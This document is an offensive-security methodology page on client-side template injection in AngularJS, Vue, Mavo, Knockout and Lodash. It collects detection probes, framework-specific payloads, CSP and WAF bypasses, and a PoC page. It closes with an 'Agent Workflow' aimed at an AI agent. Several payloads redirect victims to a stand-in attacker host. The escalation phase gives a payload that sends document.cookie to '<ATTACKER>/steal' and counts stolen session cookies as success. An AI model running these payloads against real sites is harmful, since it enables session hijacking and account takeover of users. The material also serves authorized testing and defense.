# Client-Side Template Injection (CSTI)

> **Summary**: Client-Side Template Injection occurs when user input is embedded into client-side templates (Angular, Vue.js, Mavo, etc.) and processed by the JavaScript template engine in the browser, allowing arbitrary JavaScript execution.
> **Impact**: Cross-site scripting (XSS), session hijacking, keylogging, phishing, data theft -- all executing in the victim's browser context.
> **Typical Severity**: Medium to High

## Detection

### Indicators
- Application uses a client-side JavaScript framework with template expressions (Angular, Vue.js, Mavo)
- User input is reflected in the DOM within template expression delimiters (`{{ }}`, `[[ ]]`, etc.)
- HTML source contains `ng-app`, `v-app`, `mv-app`, or similar framework directives
- Application renders user-controlled content without escaping within template contexts

### Automated Detection
- Inject `{{ 7*7 }}` in input fields and URL parameters; if `49` appears, CSTI is confirmed
- Use Burp Suite Intruder with SSTI/CSTI wordlists to test all parameters
- Wordlist: `https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt`

### Manual Detection
1. Identify the client-side framework by inspecting page source:
   ```bash
   # Look for framework indicators
   curl -s <TARGET> | grep -i 'ng-app\|ng-csp\|v-app\|vue\|angular\|mv-app\|mavo'
   ```
2. Inject a template expression:
   ```
   {{ 7-7 }}
   ```
3. If the output shows `0` instead of the literal string `{{ 7-7 }}`, the input is processed by the template engine

## CSTI vs SSTI

| Aspect | CSTI | SSTI |
|--------|------|------|
| Execution | Client-side (browser) | Server-side |
| Impact | XSS / client-side code execution | RCE / server compromise |
| Template engine | Angular, Vue.js, Mavo, etc. | Jinja2, Twig, Freemarker, etc. |
| Payload target | JavaScript execution | OS command execution |
| Detection | Same initial probes (`{{ 7*7 }}`) | Same initial probes (`{{ 7*7 }}`) |

**Key distinction**: If `{{ 7*7 }}` returns `49` and the framework is client-side JavaScript, it is CSTI. If the framework is server-side (Python/Java/PHP), it is [SSTI](ssti.md).

## Exploitation

### Prerequisites
- User input reflected within scope of a client-side template engine
- The framework is loaded on the page (Angular, Vue.js, Mavo, etc.)
- Input is not HTML-encoded before reaching the template engine, or encoding is bypassed

### Step-by-Step

1. **Identify the framework and version**:
   ```javascript
   // Angular
   angular.version  // in browser console

   // Vue.js
   Vue.version      // in browser console
   ```
   **Success**: Framework and version identified.

2. **Test basic template injection**:
   ```
   {{7*7}}
   {{constructor.constructor('return 1')()}}
   ```
   **Success**: Expression evaluates and output appears in the DOM.

3. **Escalate to JavaScript execution** using framework-specific payloads (see below).
   **Success**: `alert(1)` or equivalent JS executes in the browser.

4. **Weaponize for impact**: Replace `alert()` with cookie theft, keylogging, or session hijacking payload.

### Payloads

#### AngularJS (1.x)

**Note**: Angular 1.6+ removed the expression sandbox, making exploitation straightforward.

```javascript
// Basic alert
{{$on.constructor('alert(1)')()}}

// Constructor chain
{{constructor.constructor('alert(1)')()}}

// Event-based (no braces needed)
<input ng-focus=$event.view.alert('XSS')>

// Via class name
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">click</strong>
</div>

// CSP bypass with ng-csp
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

// Complex payload with document access
<div ng-app ng-csp>
  <textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1')?'':d.location='//attacker.com/'">
  </textarea>
</div>
```

#### Vue.js

**Vue 2:**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Vue 3:**
```javascript
{{_openBlock.constructor('alert(1)')()}}
```

**Vue v-html directive:**
```html
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\')?``:d.location=`//<ATTACKER>/`')()">xss</div>
```

#### Mavo

```javascript
[7*7]
[(1,alert)(1)]
[self.alert(1)]
[self.alert(1)mod1]
[''=''or self.alert(1)]
[Omglol mod 1 mod self.alert(1) andlol]
```

```html
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
```

#### Knockout.js

```html
<div data-bind="value: alert(1)"></div>
```

#### Underscore.js / Lodash Templates

```javascript
<%= alert(1) %>
${alert(1)}
```

### Proof of Concept

```html
<!DOCTYPE html>
<html>
<head><title>CSTI PoC - AngularJS</title></head>
<body>
<!-- Simulates a vulnerable page reflecting user input in Angular scope -->
<div ng-app>
  <!-- If user input is reflected here: -->
  <div>{{constructor.constructor('alert(document.domain)')()} }</div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

## Bypasses

- **Angular sandbox escape** (pre-1.6): Use known sandbox bypass payloads from [PortSwigger cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- **CSP with Angular**: Load Angular from an allowed CDN and use `ng-csp` directive to bypass CSP
- **WAF bypass**: Use framework-specific syntax that WAFs do not recognize as XSS:
  ```
  {{$on.constructor('alert(1)')()}}
  ```
- **Alternative delimiters**: Some frameworks allow custom delimiters; test `[[ ]]`, `<% %>`, `${ }`
- **Event handlers**: If `{{ }}` is blocked, use directive-based injection:
  ```html
  <input ng-focus=$event.view.alert('XSS')>
  ```
- **Encoding**: URL-encode template delimiters: `%7B%7B7*7%7D%7D`

## Escalation

- **XSS to session hijacking**: Steal cookies or tokens from the vulnerable origin
- **XSS to account takeover**: Change email/password via authenticated API calls
- **XSS to phishing**: Inject a fake login form into the page
- **Chain with CSP bypass**: If Angular is loaded from a CDN allowed by CSP, achieve execution despite CSP
- **Chain with CORS misconfiguration**: Use XSS to make authenticated cross-origin requests

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite Intruder | Fuzz parameters with CSTI payloads |
| Burp DOM Invader | Automated client-side vulnerability detection |
| AngularJS Payloads | [PortSwigger Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected) |
| Vue.js Payloads | [PortSwigger Research](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) |
| Wappalyzer | Identify client-side frameworks in use |

## References

- [PortSwigger - Client-Side Template Injection](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)
- [PortSwigger - Vue.js Script Gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)
- [Angular 1.6 Sandbox Removal](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html)
- [Burp Suite Academy - AngularJS CSTI Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

## Agent Workflow
> Step-by-step instructions for an AI agent to test for Client-Side Template Injection.

### Phase 1: Discovery
1. Identify the client-side JavaScript framework used on the target page:
   ```bash
   curl -s https://<TARGET>/ | grep -iE "ng-app|ng-csp|v-app|vue|angular|mv-app|mavo|knockout|data-bind"
   ```
2. Check the framework version in the browser console:
   - Angular: `angular.version`
   - Vue: `Vue.version`
3. Identify input reflection points: URL parameters, form fields, search boxes, and any user input reflected in the DOM.
4. Check if the reflected input is within the scope of the template engine (inside `ng-app`, `v-app`, or similar directives).

### Phase 2: Validation
1. Inject a basic template expression in each reflection point:
   ```
   {{7*7}}
   ```
   If the output shows `49` instead of the literal string `{{7*7}}`, CSTI is confirmed.
2. Test alternate delimiters if `{{ }}` does not work: `[[ ]]`, `<% %>`, `${ }`.
3. Distinguish CSTI from SSTI: if the framework is client-side JavaScript (Angular, Vue, Mavo), it is CSTI. If server-side (Jinja2, Twig, Freemarker), it is SSTI.
4. Test a constructor chain to confirm JS execution capability:
   ```
   {{constructor.constructor('return 1')()}}
   ```

### Phase 3: Exploitation
1. Use framework-specific payloads to achieve JavaScript execution:
   - **AngularJS**: `{{$on.constructor('alert(document.domain)')()}}`
   - **Vue 2**: `{{constructor.constructor('alert(1)')()}}`
   - **Vue 3**: `{{_openBlock.constructor('alert(1)')()}}`
   - **Mavo**: `[self.alert(1)]`
2. If `{{ }}` is blocked, use directive-based injection:
   ```html
   <input ng-focus=$event.view.alert('XSS')>
   ```
3. Replace `alert()` with a weaponized payload: cookie theft, keylogging, or session hijacking.
4. If CSP is present but Angular is loaded from an allowed CDN, use `ng-csp` directive:
   ```html
   <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
   ```

### Phase 4: Escalation
1. **XSS to session hijacking**: `{{constructor.constructor('fetch("https://<ATTACKER>/steal?c="+document.cookie)')()}}`.
2. **XSS to account takeover**: Execute authenticated API calls to change email/password.
3. **Chain with CSP bypass**: If Angular is on an allowed CDN, use CSTI to bypass CSP restrictions.
4. **Chain with CORS misconfiguration**: Use XSS from CSTI to make authenticated cross-origin requests.

## Decision Tree

```
Start: Identify client-side template engine
  |
  +---> Angular (ng-app)?
  |       +---> Version < 1.6: Sandbox escape payloads
  |       +---> Version >= 1.6: No sandbox, direct {{constructor.constructor(...)()}}
  |       +---> CSP present + Angular on allowed CDN: ng-csp bypass
  |
  +---> Vue.js (v-app)?
  |       +---> Vue 2: {{constructor.constructor('alert(1)')()}}
  |       +---> Vue 3: {{_openBlock.constructor('alert(1)')()}}
  |
  +---> Mavo (mv-app)?
  |       +---> [self.alert(1)] or [(1,alert)(1)]
  |
  +---> Other (Knockout, Underscore/Lodash)?
          +---> data-bind="value: alert(1)" or <%= alert(1) %>
```

## Success Criteria
- [ ] Client-side template engine and version identified
- [ ] Template expression evaluates in the DOM (`{{7*7}}` renders as `49`)
- [ ] JavaScript execution achieved via framework-specific payload
- [ ] If escalating: session cookies or tokens stolen via CSTI-triggered XSS
- [ ] If CSP present: bypass confirmed using framework-specific gadgets

## Cross-References

- [XSS](xss.md) -- CSTI is a specific vector for achieving XSS
- [SSTI](ssti.md) -- Server-side equivalent; same detection, different impact
- [CSP Bypass](csp-bypass.md) -- Angular-based CSP bypasses leverage CSTI
- [PostMessage Vulnerabilities](postmessage-vulns.md) -- CSTI via postMessage data injection
